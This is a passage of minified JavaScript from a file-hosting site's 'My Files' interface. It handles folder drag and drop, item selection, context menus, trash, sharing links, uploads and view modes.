tH.yJ(Xb.aQm[o.folders].parent);i=new tH.yJ(Xb.aQm[o.folders],s)}var l=i.parent?i.parent.folderkey:i.parent_folderkey,d=tH.folders.yx(l);aek||"yes"==d.shared||"child"==d.shared?LF.aFI(o.files,o.folders,t.folderkey):LF.YO(o.files,o.folders,t.folderkey),aeV(e)}finally{mainList.aTN()}return!1},Xb.aab.onFolderDragOver=NQ,Xb.aab.onFolderClick=function(e,t,a){aft(!1,!0);var o=t.folderkey;return o!=window.location.hash.slice(1)&&(window.location.hash=o),contextMenu.aoh(),aeV(e),!1},"WebkitUserDrag"in document.body.style&&(Xb.aab.onFolderMouseDown=function(e,t,a){"element"!=a.style.webkitUserDrag&&(a.style.webkitUserDrag="element")}),Tw=!1,Xb.aab.onFolderMouseDown=function(e,t,a){return!Tw},Xb.aab.onFolderDragStart=function(e,t,a){if(Tw)return!1;if(Tw=!0,setTimeout((function(){Tw=!1}),500),aek)return aeV(e),!1;var o=t.folderkey,n=t;return aTB(n)||aTB(n.parent)||2==NZ(n)?("element"==a.style.webkitUserDrag&&e.originalEvent.dataTransfer.setDragImage(document.getElementById("preventDefaultDragImg"),0,0),mainList.aTN(),$("#container").addClass("drag_active"),tH.MYF_oSelected.folders.push(t.folderkey),$.publish("list/selection"),e.originalEvent.dataTransfer.setData("Text",JSON.stringify({files:"",folders:o})),!0):(aeV(e),!1)},Xb.aab.onFolderDragEnd=function(e,t,a){mainList.aTN(),$("#container").removeClass("drag_active"),$(".folder_highlight").removeClass("folder_highlight")},Xb.aab.onFolderDragEnter=function(e,t,a){return $(a).addClass("folder_highlight"),!1},Xb.aab.onFolderDragLeave=function(e,t,a){return $(a).removeClass("folder_highlight"),!1},Xb.aab.onFolderBrowserLoad=function(){for(aZG in Xb.aQm)tH.folders.yx(aZG.folderkey)||tH.folders.Yx(aZG.folderkey,bku(aZG))},Xb.aab.onFolderAdd=function(e){tH.folders.yx(e.folderkey)||tH.folders.Yx(e.folderkey,bku(e))},$("#new_folder_trigger").click((function(){GH.abV.open(tH.currentFolder.folderkey||"")})),$("#btn_expandlistview").click((function(){return Xb.CD(),!1})),$("#folderTree").find("a.popup-close").click((function(){return Xb.CD(),!1})),$("#imageview_showfolders").click((function(){return Xb.CD(),!1})),$(".trashCan").on("drop",(function(e){var t;if($("#container").removeClass("drag_active"),(!e.originalEvent.dataTransfer.files||0==e.originalEvent.dataTransfer.files.length)&&"{"==e.originalEvent.dataTransfer.getData("Text").substr(0,1))try{t=JSON.parse(e.originalEvent.dataTransfer.getData("Text"));var a={};if(!(a=t.files?tH.files.yx(t.files.split(",")[0]):tH.folders.yx(t.folders.split(",")[0]))){var o=new tH.yJ(Xb.aQm[t.folders].parent);a=new tH.yJ(Xb.aQm[t.folders],o)}var n=a.parent?a.parent.folderkey:a.parent_folderkey,r=tH.folders.yx(n);aek||"yes"==r.shared||"child"==r.shared||a.delete_date||LF.Zs(t.files,t.folders),aeV(e)}finally{mainList.aTN()}return!1})).on("dragenter dragover",(function(e){return $(this).addClass("folder_highlight"),e.preventDefault(),!1})).on("dragleave",(function(e){return $(this).removeClass("folder_highlight"),e.preventDefault(),!1}))}function bku(e){var t=new tH.yJ(e);t.folders={};for(var a=0,o=e.folders.length;a<o;a++)t.folders[e.folders[a].folderkey]=bku(e.folders[a]);return e.parent&&(t.parent_folderkey=e.parent.folderkey),t}function aTY(){var e=new agX(".myaccountlist_content",{});return e.$container=$("#form-save"),e.asf="myaccount",e.amA=function(){return tH.myaccount.folderkey},e.anf=function(){try{WU=this;var e={};e.myaccount=new alU({agV:"myaccount",amB:"My Files",agd:amJ(tH.myaccount.folders)||{},ams:"",NTN_sDisplayClass:"",UU:parseInt(tH.myaccount.folder_count,10)>0?"yes":"no"}),$.each(tH.myaccountfolders,(function(t,a){e[t]=new alU({agV:t,amB:a.name,agd:amJ(a.folders)||{},ams:a.parent.folderkey,NTN_sDisplayClass:SHARED||"no"==a.shared||""==a.shared?"":"nav-linked-folder",UU:parseInt(a.folder_count,10)>0?"yes":"no"})})),WU.agY.Wr=e}catch(e){LogDlErrorMyFiles(e,"MYF:auA.anf()")}},e.aHc=function(t,a){var o=e.agY.Wr;a?$.each(t.folders,(function(t,a){o[a.folderkey]||e.ans(a)})):(e.ans(t),$.each(t.folders,(function(a,n){(!o[n.folderkey]||o[n.folderkey].agd.length<t.folders.length)&&e.ans(n,tH.folders.memory[folderkey].Zp().length<tH.azm?"false":"true")})))},e}function aTU(){$.subscribe("myaccount/loaded",(function(e){auA.amK=e,auA.ane(),auA.amW()})),$.subscribe("folder/nav_expand",(function(e){var t=tH.myaccountfolders[e];SHARED&&t&&(!t.folders||$.isEmptyObject(t.folders))&&aHa.aGU(t,null,(function(a){$.each(a.folders,(function(e,a){a.parent=t,tH.myaccountfolders[a.folderkey]=a})),auA.aHc(a),auA.aPN(e)}),!0)}))}function aev(){$selectionactions.delegate("div[data-command]","dragover",NQ).delegate("div[data-command]","dragend",(function(e){$(this).unbind("dragover drop"),mainList.XF(e)})).delegate("div[data-command]","drop",(function(e){var t=$(this),a=t.data("command"),o=OK(),n=(tH.MYF_oSelected&&tH.MYF_oSelected.files.length?tH.files.yx(o.files.split(",")[0]):tH.folders.yx(o.folders.split(",")[0])).parent.folderkey,r=tH.folders.yx(n),i=aek||!aTB(r);switch(a){case"view-items":aRM();break;case"move":i?GH.aFW.open(o.files,o.folders):GH.aai.open(o.files,o.folders);break;case"copy-items":case"copy-item":GH.aFW.open(tH.MYF_oSelected);break;case"delete":GH.yw.open(o.files,o.folders);break;case"download":adI();break;case"share":R(tH.MYF_oSelected);break;case"save-to-account":aZe?GH.avb.open(o.files):blX("RequireLogin");break;default:try{console.warn("unrecognized command")}catch(e){}}return $("#container").removeClass("drag_active"),$("#dragIcon").hide(),t.removeClass("folder_highlight"),aeV(e),!1})).delegate("span[data-command]","mousedown",(function(e){var t=$(this);switch(t.data("command")){case"view-items":aRM($("a",t))}})).delegate("span[data-command]","click",(function(e){var t=$(this).data("command"),a=mainList.WP(),o={};tH.MYF_oSelected&&tH.MYF_oSelected.files.length?o=tH.files.yx(tH.MYF_oSelected.files[0]):tH.MYF_oSelected.folders.length&&(o=tH.folders.yx(tH.MYF_oSelected.folders[0]));var n=o.parent.folderkey,r=tH.folders.yx(n),i=aek||!aTB(r),s=0;switch(aTB(r)||(s=NZ(r)),t){case"view-items":return!0;case"move":i&&!window.afv()&&2!=s&&3!=s?GH.aFW.open(tH.MYF_oSelected.files,tH.MYF_oSelected.folders):GH.aai.open(tH.MYF_oSelected.files,tH.MYF_oSelected.folders);break;case"copy-items":case"copy-item":GH.aFW.open(tH.MYF_oSelected);break;case"delete":case"purge":bfw()?LF.bet(tH.MYF_oSelected.files.join(),tH.MYF_oSelected.folders.join(),!0):GH.yw.open(tH.MYF_oSelected.files,tH.MYF_oSelected.folders);break;case"restore":GH.aXh.open({success:function(e){LF.YO(tH.MYF_oSelected.files.join(),tH.MYF_oSelected.folders.join(),e)}});break;case"download":adI();break;case"share":R(tH.MYF_oSelected);break;case"save-to-account":aZe?GH.avb.open(a.files):blX("RequireLogin");break;default:try{console.warn("unrecognized command")}catch(e){}}return aeV(e),!1})).find("div[data-command]").unbind("draghover").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter)}))}function aUd(){var e=function(){var e={folders:[tH.currentFolder.folderkey]};aek&&afQ&&tH.currentFolder.folderkey==tH.root.folderkey&&(e={folders:ajm(tH.currentFolder.folders),files:ajm(tH.currentFolder.files)}),akO(e,"context_menu")},t=function(){var e={folders:[tH.currentFolder.folderkey]};if(aek&&afQ&&tH.currentFolder.folderkey==tH.root.folderkey&&(e={folders:ajm(tH.currentFolder.folders),files:ajm(tH.currentFolder.files)}),!afQ){var t=tH.currentFolder;aTB(t)||(!0,NZ(t))}R(e)};$MYF_oFolderActions.delegate("#current_folder_download","click",(function(t){e(),aeV(t)})),$MYF_oFolderActions.delegate("#new_folder_trigger","click",(function(e){GH.abV.open(tH.currentFolder.folderkey),aeV(e)})),$MYF_oFolderActions.delegate("#current_folder_share","click",(function(e){t(),aeV(e)})),$("#headerControlsMyFiles").delegate("#inactive_uploadMenu","click",(function(e){Zi(0,"Sorry, you do not have permission to upload to this folder."),aeV(e)})).delegate("#inactive_createMenu","click",(function(e){Zi(0,"Sorry, you do not have permission to create a folder in this folder."),aeV(e)})).delegate("#inactive_createFile","click",(function(e){Zi(0,"Sorry, you do not have permission to create a file in this folder."),aeV(e)})).delegate("#trash_restoreAll","click",(function(e){GH.aXh.open({success:function(e){new window.tH.aCa(window.aCQ||0);bed((function(t){LF.YO(t.files,t.folders,e)}))}}),aeV(e)})).delegate("#trash_deleteAll","click",(function(e){LF.MYF_mEmptyTrash(window.aCQ||0,!0),aeV(e)})).delegate("#createMenu","click",(function(e){GH.aRo.open("txt")})),$("#shareMenu a").click((function(){switch($(this).data("command")){case"download-folder":e();break;case"share-folder":t();break;case"unfollow-folder":aMk(tH.currentFolder.folderkey)}return!1}))}function aet(){$("#upload_to_current_folder .show_uploader").click((function(){LF.ZR(),GLB_fSendToUploader(tH.currentFolder.folderkey||"myfiles")})),$("#emptyfolder_manual_upload").click((function(){LF.ZR(),GLB_fSendToUploader(tH.currentFolder.folderkey||"myfiles")})),$("#upload_to_current_folder").find(".dropdown").dropdown(),$("#upload_from_web, #webUploadIndicator").click((function(){aZS?LoadIframeLightbox("/dynamic/webupload.php?folderkey="+tH.currentFolder.folderkey,700,420,!1,!1,!0):blu("/templates/web_upload/web_upload_upsell.php",600,450)}))}function aEo(){$("#container");var e={Start:function(e){e.originalEvent.dataTransfer.setData("Text",JSON.stringify(OK()))},XF:function(e){$(".folder_highlight").removeClass("folder_highlight")},ajP:function(){return window.afv()?"aRL":"currentFolder"},WI:function(e){return e?tH.MYF_oSelected[e]:tH.MYF_oSelected},WP:function(e){return e?mainList.WI(e).join(","):{files:mainList.WI("files").join(","),folders:mainList.WI("folders").join(",")}},VB:function(e){return e?tH.MYF_oSelected[e].length:tH.MYF_oSelected.files.length+tH.MYF_oSelected.folders.length},ZF:function(e){if(!e)return!1;var t=tH.files.yx(e)?"files":"folders",a=tH[t].yx(e);a&&$.inArray(e,tH.MYF_oSelected[t])&&(tH.MYF_oSelected[t].push(e),a.selected=!0)},alB:function(e){if(!e)return!1;var t=tH.files.yx(e)?"files":"folders",a=tH[t].yx(e)||tH[mainList.ajP()][t][e];if(a){var o=$.inArray(e,tH.MYF_oSelected[t]);-1!=o&&(tH.MYF_oSelected[t].splice(o,1),a.selected=!1)}$.publish("list/selection")},adh:function(e,t){if(!e)return!1;var a=tH.files.yx(e)?"files":"folders",o=tH[a].yx(e)||tH[mainList.ajP()][a][e];if(o&&o.selected)return!1;if(void 0===o)return!1;if(mainList.VB("folders")>=tH.aaI||mainList.VB("files")>=tH.aaI){if(!t){var n=mainList.VB("folders")>=tH.aaI?"folder":"file";Zi(0,"Max "+n+" selection reached.<br />Only "+tH.aaI+" "+n+"s can be selected at a time.")}return!1}return mainList.ZF(e),$('#main_list li[data-key="'+e+'"]').addClass("file_selected"),$.publish("list/selection"),!0},aNK:function(e){return!!e&&(mainList.alB(e),$("#main_list li[data-key = '"+e+"']")&&$("#main_list li[data-key = '"+e+"']").removeClass("file_selected"),$.publish("list/selection"),!0)},aSn:function(e){if(!e)return!1;var t=tH.files.yx(e)?"files":"folders",a=tH[t].yx(e)||tH[mainList.ajP()][t][e];return a&&a.selected?mainList.aNK(e):mainList.adh(e)},akV:function(){tH.aSk=!0,mainList.aVB(tH.aca),$.publish("list/selection")},aTN:function(e){tH.aSk=!1,tH.aQX=!1,tH.aWb=!1,tH.MYF_oSelected={files:[],folders:[]},tH[mainList.ajP()]&&($.each(tH[mainList.ajP()].folders,(function(){this.selected=!1})),$.each(tH[mainList.ajP()].files,(function(){this.selected=!1})),$.each(tH.folders.memory,(function(){this.selected=!1})),$.each(tH.files.memory,(function(){this.selected=!1}))),$mainList.children(".file_selected").removeClass("file_selected"),e||$.publish("list/selection")},aVS:function(e){mainList.aTN(!0);var t=tH.aca;tH.aQX=e,aRs="folder"==e||"file"==e?$.grep(t,(function(t){return"file"==e?t.quickkey:t.folderkey})):$.grep(t,(function(t){return t.filetype==e}));var a="";aRs.length&&(tH.aWb=!0,$.each(aRs,(function(){var e=this.quickkey?"file":"folder";mainList.VB(e+"s")+1<=tH.aaI?mainList.adh(this.quickkey?this.quickkey:this.folderkey,!0):a=e}))),a&&(tH.aWb=!1,Zi(0,"Max "+a+" selection reached.<br>Only "+tH.aaI+" "+a+"s can be selected at a time.")),$.publish("list/selection")},aVB:function(e){tH.MYF_oSelected={files:[],folders:[]};var t="";$.each(e,(function(){if("yes"!=this.shared&&"child"!=this.shared&&1!=this.shared||"yes"==this.parent.shared||"child"==this.parent.shared){var e=this.quickkey?"file":"folder",a=this.quickkey?this.quickkey:this.folderkey;mainList.VB(e+"s")+1<=tH.aaI?(tH.MYF_oSelected[e+"s"].push(a),tH[e+"s"].yx(a).selected=!0,$("#main_list li[data-key = '"+a+"']").addClass("file_selected")):(tH.aWb=!1,t=e)}})),t&&(tH.aSk=!1,Zi(0,"Max "+t+" selection reached.<br>Only "+tH.aaI+" "+t+"s can be selected at a time."))},apz:function(e){e.length},available:0};return e}function afo(){$.subscribe("file/move folder/move file/delete folder/delete",(function(){mainList.aTN(),aua(!0)})),$.subscribe("selection/deselectall",(function(){mainList.aTN()})),$.subscribe("list/selection",(function(e){var t=tH.MYF_oSelected,a=mainList.VB();a>0&&"on"===aL("thumbview")?$(".thumbnailSelect").show():$(".thumbnailSelect").hide(),$(".selected_count").html(a),$("#myfiles_selection").toggleClass("all_files_selected",mainList.available&&a+$("li.collaborate-active").length===mainList.available),"none"===$("#selection-actions").css("display")&&(ahb=$("#folder_infobox").outerHeight());ahb;var o=!0;("yes"!==tH.currentFolder.shared||"child"!==tH.currentFolder.shared)&&t.folders.length>0&&$.each(t.folders,(function(e){if("yes"===window.tH.folders.yx(t.folders[e]).shared)return o=!1})),(a>0||$("#main_list li.file_selected").length>0)&&o?($("#folder_infobox").toggleClass("files_selected",a>0),$("#selection-actions").slideDown(0,(function(){$(window).trigger("resize")}))):$("#selection-actions").slideUp(0,(function(){$("#folder_infobox").toggleClass("files_selected",a>0),$(window).trigger("resize")})),a>0&&$mainList.bind("clickoutside",(function(e){$(e.target).parents("#folderTree, #myfiles_controlbar, #myfiles_selection, #contextmenu").length||mainList.aTN(),0==mainList.VB()&&$mainList.unbind("clickoutside"),aeV(e)}));var n=tH.MYF_oSelected;if(n.folders.length?($("#folder_infobox").addClass("selection-hasfolders"),$(".file-only-op").hide()):($("#folder_infobox").removeClass("selection-hasfolders"),$(".file-only-op").show(),$(".file-only-op[data-command='save-to-account']").toggle(aek&&!Yb)),n.files.length?$("#container").removeClass("only-folders-selected"):$("#container").addClass("only-folders-selected"),$("#selection-actions span[data-command='share']").toggle(!(n.files.length>0&&n.folders.length>0)),1==n.files.length&&0==n.folders.length){var r;if(afv())for(var i=0;i<tH.XE.length;i++){var s=tH.XE[i];if(s&&s.quickkey&&s.quickkey==n.files[0]){r=s;break}}else r=tH.currentFolder.files[n.files[0]];$(".file-only-op[data-command='view-items']").toggle(r&&r.previewSupported),bfw()?$("#selection-actions span[data-command='share']").hide():$("#selection-actions span[data-command='share']").show()}if(n.files.length>1&&$.each(n.files,(function(e){var t;if(afv())for(var a=0;a<tH.XE.length;a++){var o=tH.XE[a];if(o&&o.quickkey&&o.quickkey==n.files[0]){t=o;break}}else t=tH.currentFolder.files[n.files[e]];t&&"image"!=t.filetype&&$("*[data-command='view-items']").hide()})),aTB(tH.currentFolder))$("#selection-actions").removeClass("showFollow showFollowing collab-selection-view collab-selection-edit collab-selection-manage shareLinkDisabled");else{var l=3,d=!0;n.files.length>0&&$.each(n.files,(function(e){var t=tH.files.yx(n.files[e]),a=NZ(t);if(l=a<l?a:l,d&&(d=!(!t.privacy||"private"==t.privacy)),0==l)return!1})),n.folders.length>0&&0!=l&&$.each(n.folders,(function(e){var t=tH.folders.yx(n.folders[e]),a=NZ(t);if(l=a<l?a:l,d&&(d=!(!t.privacy||"private"==t.privacy)),0==l)return!1})),$("#selection-actions").toggleClass("showFollowing",0!=l).toggleClass("showFollow",0==l).toggleClass("collab-selection-view",1==l).toggleClass("collab-selection-edit",2==l).toggleClass("collab-selection-manage",3==l).toggleClass("shareLinkDisabled",!d),(n.files.length>0&&n.folders.length>0||n.files.length>1||n.folders.length>1)&&$("#selection-actions").removeClass("showFollow showFollowing")}e&&($.each(tH.MYF_oSelected.folders,(function(){$("#folder-"+this)&&$("#folder-"+this).addClass("file_selected")})),$.each(tH.MYF_oSelected.files,(function(){$("#file-"+this)&&$("#file-"+this).addClass("file_selected")})))})),$.subscribe("folder/render",(function(){mainList.available=$mainList.children("li").length}))}function ahv(){$("#select_deselect_all").click((function(){tH.MYF_oSelected&&(tH.MYF_oSelected.files.length||tH.MYF_oSelected.folders.length)?mainList.aTN():mainList.akV()})),$("#myfiles_selection").find(".dropdown").dropdown((function(e){switch(e){case"all":mainList.akV();break;case"deselect":mainList.aTN();break;default:mainList.aVS(e)}}))}function afb(e){return $mainList.children("li").not(".collaborate-active").not("collaborate-disabled").length-e.length==mainList.NA().length}function aof(e,t){"folder"==t?$.each(tH.aca,(function(e){this.folderkey&&"yes"!=this.shared&&"child"!=this.shared&&mainList.adh(this.folderkey)})):$.each(tH.aca,(function(e){this.filetype!=t&&"file"!=t||this.quickkey&&"yes"!=this.shared&&"child"!=this.shared&&mainList.adh(this.quickkey)})),$.publish("list/selection",[tH.MYF_oSelected,tH.MYF_oSelected.files.length+tH.MYF_oSelected.folders.length])}function aiS(){var e=new Image,t=[];e.src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",$mainList.bind("clickoutside",(function(e){aeV(e)})).delegate("li.folder, li.file","mouseenter",(function(e){$(this).addClass("row_focus"),aeV(e)})).delegate("li.folder, li.file","mouseleave",(function(e){$(this).removeClass("row_focus"),$(this).removeClass("folder_highlight"),aeV(e)})).delegate("li.folder, li.file","contextmenu",(function(e){tH.Pz&&aTP("#"+$mainList.find(".updatename").not(":hidden").closest("li").attr("id"));tH.MYF_oSelected&&tH.MYF_oSelected.files.length>0&&tH.MYF_oSelected.files&&-1==tH.MYF_oSelected.files.indexOf($(this).data("key"))&&-1==tH.MYF_oSelected.folders.indexOf($(this).data("key"))&&mainList.ZF($(this).data("key")),aeV(e);var t,a,o=$(this);return $.each($(".row_context"),(function(){$(this).hasClass("file_selected")||mainList.alB($(this).data("key"))})),tH.MYF_oSelected.files.length+tH.MYF_oSelected.folders.length>1?(t="multiple",a=mainList.WP()):(t=o.is(".file")?"file":"folder",a=o.data("key")),contextMenu.open("mainlist",t,aiH(e,-2,-2),a),!1})).delegate("li.folder, li.file","click",(function(e){mainList.WI();var t=$(this),a=$(e.target),o=tH[t.hasClass("file")?"files":"folders"].yx(t.data("key"));if(!a.hasClass("item-name")||o&&o.delete_date){if(a.hasClass("collaborate-active")||a.hasClass("collaborate-disabled")||a.closest("li").hasClass("collaborate-active")||a.closest("li").hasClass("collaborate-disabled"))return mainList.aTN(),void aeV(e);if(contextMenu.isVisible()&&contextMenu.aoh(),a.is("a.sharedByUser")&&(o.quickkey?R({files:[o.quickkey]}):R({folders:[o.folderkey]})),!(a.is(".updatename")||a.is(".btns_column")||a.parents(".btns_column").length||a.is(".foldername")||a.is("a")||a.is("span.dropbox"))){if(tH.Pz){var n="#"+$mainList.find(".updatename").not(":hidden").closest("li").attr("id");aTd($(n).data("key"),$(n).hasClass("file")?"file":"folder")}if(mainList.VB()<=0&&mainList.aTN(),e.shiftKey&&mainList.VB()){var r,i;function s(e){var t=e.hasClass("file")?"files":"folders";return tH[t].yx(e.data("key")).itemrownum}if("Internet Explorer"==BrowserName()&&"9.0"==Bm()&&(document.onselectstart=function(){return!1}),document.selection?document.selection.empty():window.getSelection&&window.getSelection().removeAllRanges(),i=function(e){if(1==mainList.VB()){var t=mainList.VB("files")>0?"files":"folders",a="files"==t?mainList.WI("files")[0]:mainList.WI("folders")[0];return tH[t].yx(a).itemrownum}return s(e)<$(".file_selected").first().data("rownum")?$(".file_selected").last().data("rownum"):$(".file_selected").first().data("rownum")}(t),(r=s(t))!=i){var l=[];l=r>i?tH.aca.slice(i,r+1):tH.aca.slice(r,i+1),$.each(l,(function(e,t){for(var a=this.quickkey?"quickkey":"folderkey",o=!1,n=tH.MYF_oSelected["quickkey"==a?"files":"folders"],r=0;r<n.length;r++)if(n[r]==this[a]){o=!0;break}o||mainList.ZF(this[a])})),$.publish("list/selection",!0)}"Internet Explorer"==BrowserName()&&"9.0"==Bm()&&window.setTimeout((function(){document.onselectstart=null}),1e3)}else mainList.aSn(t.data("key"));return aeV(e),(!o||!o.delete_date)&&void 0}aeV(e)}})).delegate("li.folder a.download, li.file a.download","click",(function(e){akO(adn(e),"list_item"),aeV(e)})).delegate("li.folder a.share, li.file a.share","click",(function(e){R(adn(e)),aeV(e)})).delegate("li.folder a.foldername","click",(function(e){var t=$(this).closest("li.folder").data("key"),a=tH.folders.yx(t);return a&&a.delete_date?(mainList.aSn(t),aeV(e),!1):t==window.location.hash.slice(1)?(aeV(e),!1):void 0})).delegate("li a.filetype_column","click",(function(e){aeV(e)})).delegate("li.file a.nonshareableMark","click",(function(e){if(!aZS){var t=$(this).closest("li").data("key"),a=tH.files.yx(t);LoadIframeLightbox("/templates/archive_sharing_info.html",720,280,!1,!1,!0);var o=function(){try{$("#modal_msg_iframe").contents().find(".mp_plan").length<=0?setTimeout(o,50):($("#modal_msg_iframe").contents().find(".filename").text(a.filename),$.each($("#modal_msg_iframe").contents().find(".mp_plan"),(function(){var e=$(this).data("plan-string"),t=(oPricingData[e].length>0?oPricingData[e]:null).split(".");$(this).find(".monthly_text").text(t[0]),$(this).find(".cents").text(t[1])})))}catch(e){}};setTimeout(o,50)}aeV(e)})).delegate("li.file a.dmcaReviewMark, li.file a.statusDMCAReview","click",(function(e){var t=$(this).closest("li").data("key"),a=window.tH.files.yx(t);LoadIframeLightbox("/templates/dmca_lightbox.html",500,475),a.dmca_company||awS(a,(function(e){setTimeout((function(){awQ(e,[t])}),500)})),aeV(e)})).delegate("div.search_details span.file_location a","click",(function(e){$(this).attr("href")==window.location.hash&&$(window).hashchange()})).delegate("a.fileoptions","click",(function(e){var t,a,o=$(window),n=$(this),r=n.closest("li"),i=n.offset(),s=!1,l=!1;tH.MYF_oSelected.files.length+tH.MYF_oSelected.folders.length>1&&ahz(r.data("key"))?(t="multiple",a=OK()):(t=r.is(".file")?"file":"folder",a=r.data("key")),i&&(i.left>o.width()/2&&(i.left+=n.outerWidth(),s=!0),i.top-o.scrollTop()>o.height()/2?l=!0:i.top+=n.outerHeight()+1),contextMenu.CD("mainlist",t,i,a,s,l),aeV(e)})).delegate("li.folder, li.file","dragstart",(function(t){if($(this).find(".updatename").is(":visible"))return!1;mainList.adh($(this).data("key"));var a=$(this).data("key"),o=$(this).hasClass("folder")?"folder":"file",n="folder"==o?tH.folders.yx(a):tH.files.yx(a),r=tH.currentFolder,i=aek||!aTB(r),s=0;$("#container").addClass("drag_active"),i&&(s=NZ(r)),"file"==o&&n&&n.parent&&n.parent.files&&1==parseInt($(".selected_count").html())&&(!i||2==s||3==s)&&$.each(n.parent.files,(function(e,t){t.quickkey!=n.quickkey&&"image"!=t.filetype&&"image"!=n.filetype&&0==avH(t.flag,3)&&$("#file-"+t.quickkey).addClass("file_droppable").bind("draghover",(function(e){$(this).toggleClass("folder_highlight",e.enter),$("#container").unbind("drop.fileupdate")})).bind("drop.fileupdate",(function(e){return GH.GA.open($(this).data("key")+","+n.quickkey),!1}))})),function(a){var o=[],n=0;i&&(n=NZ(a));var r="moving";"trash"==a.parent.folderkey?r="restoring":i&&2!=n&&(r="copying");var s=$("li.file_droppable").length>0&&!i?r+"/updating":r;$("li.file_selected").each((function(e){$(this).hasClass("folder")?o[e]=1==parseInt($(".selected_count").html())?"folder":"folders":o[e]=1==parseInt($(".selected_count").html())?"file":"files"}));var l=o.filter((function(e,t,a){return t==a.indexOf(e)}));if(l.length>1?aFT="folders &amp; files":aFT=l[0],!$("body").is(".windows.safari")){$("#dragIcon span").html($(".selected_count").is(":visible")?$(".selected_count").html():"1"),$("#dragIcon strong").html(s+" "+aFT+" ");var d=$("#myfiles_wrap").width()-$("#dragIcon").width()-42;"setDragImage"in t.originalEvent.dataTransfer&&($("#dragIcon").show(),t.originalEvent.dataTransfer.setDragImage(e,0,0)),$("body *").bind("dragover",(function(e){$("#dragIcon").css("top",e.originalEvent.pageY+10).css("left",e.originalEvent.pageX<d?e.originalEvent.pageX+10:null).css("z-index",9999)}))}}(n),mainList.Start(t)})).delegate("li.folder, li.file","dragend",(function(e){$(this).removeClass("folder_highlight"),$("li.file_droppable").unbind("dragover drop").removeClass("file_droppable"),$("#container").removeClass("drag_active"),$("#dragIcon").hide(),mainList.XF(e);var t=tH.MYF_oSelected;("yes"!=tH.currentFolder.shared||"child"!=tH.currentFolder.shared)&&t.folders.length>0&&$.each(t.folders,(function(e){"yes"==tH.folders.yx(t.folders[e]).shared&&mainList.aTN()}))})).delegate("li.folder, li.file","dragover",(function(e){var t=!1;if("folder"==this.id.split("-")[0]){t=!0;var a=$("#main_list .folder_highlight");a.length>1&&a.removeClass("folder_highlight"),t&&!$(this).hasClass("folder_highlight")&&$(this).addClass("folder_highlight"),NQ(e)}else $("#main_list .folder_highlight").removeClass("folder_highlight")})).delegate("li.folder","drop",abh).delegate("li.file","drop",(function(e){$("#dragIcon").hide();try{(e.dataTransfer||e.originalEvent.dataTransfer).types.contains("Files")||NQ(e),abh(e)}catch(e){}})).delegate("li.file a.private","click",(function(e){var t=$(this).closest("li");GH.abB.open("public",t.data("key")),aeV(e)})).delegate("li.file a.public","click",(function(e){var t=$(this).closest("li");GH.abB.open("private",t.data("key")),aeV(e)})).delegate("li.folder a.private","click",(function(e){var t=$(this).closest("li");GH.abz.open("public",t.data("key")),aeV(e)})).delegate("li.folder a.public","click",(function(e){var t=$(this).closest("li");GH.abz.open("private",t.data("key")),aeV(e)})).delegate("li.file a.password","click",(function(e){var t=$(this).closest("li");GH.aim.open(t.data("key"),fu,!0),aeV(e)})).delegate("a.rowTrashBtn.gbtnTertiary","click",(function(e){var t=$(this).closest("li"),a=t.data("key"),o=t.hasClass("file");LF.bet(o?a:"",o?"":a,!0),aeV(e)})).delegate("a.rowTrashBtn.gbtnPrimary","click",(function(e){var t=$(this).closest("li"),a=t.data("key"),o=t.hasClass("file");GH.aXh.open({success:function(e){var t=o?"":a,n=o?a:"";LF.YO(n,t,e)}}),aeV(e)})).delegate("li.mf_filecontainer.public","mouseenter",(function(){var e=$(this),a=e.hasClass("folder")?"folder":"file",o=e.find("a.shareLinkEnabled"),n=o.find(".tooltip"),r=tH[a+"s"].yx(e.data("key")),i="Share link is enabled for this "+a+".";if(void 0===r)i="Unable to find resource.";else if(Clipboard.isSupported()){i+="<br />Click to copy link.",t.forEach((function(e){e&&e.destroy()})),t=[];var s=r.clickLink;s||(s=agW(r)),new Clipboard(o[0],{text:function(e){return s}}).on("success",(function(e){try{gtag("event","copy_link")}catch(e){}Zi(0,"Copied to Clipboard"),r.folderkey&&ValidateFolderCopyLinkSafe(r.folderkey)}))}n.html(i)}))}function alm(){$("#viewtab1").click((function(){return $(this).hasClass("changeview_active")||($("#main_list").empty(),$(this).addClass("changeview_active").siblings("a").removeClass("changeview_active"),$("#myfiles_wrap").removeClass("thumbnailView sizeS sizeM sizeL").addClass("listView"),aU("thumbview","off",1),aPC(),$.publish("view/changemode"),$(window).resize()),!1})),$("#viewtab2").click((function(){if(!$(this).hasClass("changeview_active")){$("#container").hasClass("searchmode")||$("#main_list").empty(),$(this).addClass("changeview_active").siblings("a").removeClass("changeview_active");$("#myfiles_wrap").removeClass("listView sizeS sizeM sizeL").addClass("thumbnailView "+(aL("mfsize")?"size"+aL("mfsize"):"sizeS")),aU("thumbview","on",1800),aOV(),$.publish("view/changemode")}return!1}))}function aOV(){afv()||tH.XY()}function aPC(){afv()||tH.XY()}function bgC(e,t){$("#container").removeClass(t).addClass(e);var a=$('#myfiles_sortcontrol li[data-command="'+e.split("-")[1]+'"]'),o=a.text();a.length>0&&($("#sort_current").html(o+' <span class="arrow_down"></span>'),a.find("span").addClass("arrow_down")),sortBy="name",$.publish("list/sort")}function bfi(){bgC("sort-expire","sort-created sort-size sort-downloads sort-relevancy"),$("#container").addClass("trashMode")}function bff(){$("#container").hasClass("sort-expire")&&bgC("sort-created","sort-expire"),$("#container").hasClass("sort-date")&&bgC("sort-created","sort-date"),$("#container").removeClass("trashMode")}function bfw(){return $("#container").hasClass("trashMode")}function aeT(){tH.aVy=!0,$("#viewtab1, #viewtab2").hide(),$("#container").addClass("searchmode")}function afv(){return $("#container").hasClass("searchmode")}function adz(){return $("#container").hasClass("searchresults")}function aGn(e,t){for(var a=e.length,o=0;o<a;o++){var n="file"===e[o].type?"Cp":"yJ";e[o]=new tH[n](e[o])}aeT(),$("#main_list").css({margin:0}),$("#search_all_folders").toggle(!e.length),t||"myfiles"===aGy.folderkey?!0===t||"myfiles"===aGy.folderkey?($("#search_all_btn").hide(),$("#no_results_folder").text("all folders")):$("#search_all_folders").hide():($("#search_all_btn").show().on("click",(function(e){return afB(tH.folders.yx("myfiles"),$("#search").val(),!0),tH.aVy=!0,aeV(e),!1})),$("#no_results_folder").text("this folder")),$("#container").addClass("searchresults"),$(window).trigger("resize"),tH.XE=e,setTimeout((function(){sortBy="relevancy",sortAscending=!0,$("#sort_current 